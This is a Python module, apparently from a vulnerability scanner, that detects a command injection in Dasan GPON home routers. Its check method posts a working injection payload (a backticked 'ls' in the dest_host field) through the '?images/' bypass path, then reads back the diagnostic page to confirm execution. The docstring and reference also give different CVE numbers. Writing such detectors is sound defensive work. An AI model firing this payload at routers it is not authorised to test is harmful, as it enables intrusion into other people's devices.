"""Agent Asteroid implementation for CVE-2018-10561"""

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = "Dasan GPON Routers Command Injection Vulnerability."
VULNERABILITY_REFERENCE = "CVE-2018-10562"
VULNERABILITY_DESCRIPTION = (
    "Dasan GPON home routers suffer from a Command Injection vulnerability. The issue occurs via the `dest_host`"
    " parameter in a `diag_action=ping` request to a `GponForm/diag_Form` URI."
)
RISK_RATING = "CRITICAL"

DEFAULT_TIMEOUT = 90

REFERENCES = {
    "VPN Mentor Technical Details": "https://www.vpnmentor.com/blog/critical-vulnerability-gpon-router/",
    "Exploit-Database PoC": "https://www.exploit-db.com/exploits/44576",
}


@exploits_registry.register
class CVE201810562Exploit(definitions.Exploit):
    """CVE-2018-10562: Dasan GPON Routers Command Injection Vulnerability."""

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        references=REFERENCES,
        risk_rating=RISK_RATING,
        has_public_exploit=True,
        targeted_by_malware=True,
        targeted_by_ransomware=True,
        targeted_by_nation_state=True,
    )

    def accept(self, target: definitions.Target) -> bool:
        try:
            self.session.get(target.origin, timeout=DEFAULT_TIMEOUT)
        except requests_exceptions.RequestException:
            return False

        # TODO(alaeddine): Consider testing for '/?images/', '/GponForm/diag_Form?images/', '/diag.html?images/'.
        return True

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        data = {
            "XWebPageName": "diag",
            "diag_action": "ping",
            "wan_conlist": "0",
            # Test for a simple `ls` command.
            "dest_host": "`ls`;ls",
            "ipv": "0",
        }

        try:
            self.session.post(
                target.origin + "/GponForm/diag_Form?images/",
                data=data,
                timeout=DEFAULT_TIMEOUT,
            )
            response = self.session.get(
                target.origin + "/diag.html?images/",
                timeout=DEFAULT_TIMEOUT,
            )
        except requests_exceptions.RequestException:
            return []
        if "diag_result" not in response.text:
            return []

        vulnerability = self._create_vulnerability(target)
        vulnerability.technical_detail += f"\n```\n{response.text}\n```\n"
        return [vulnerability]
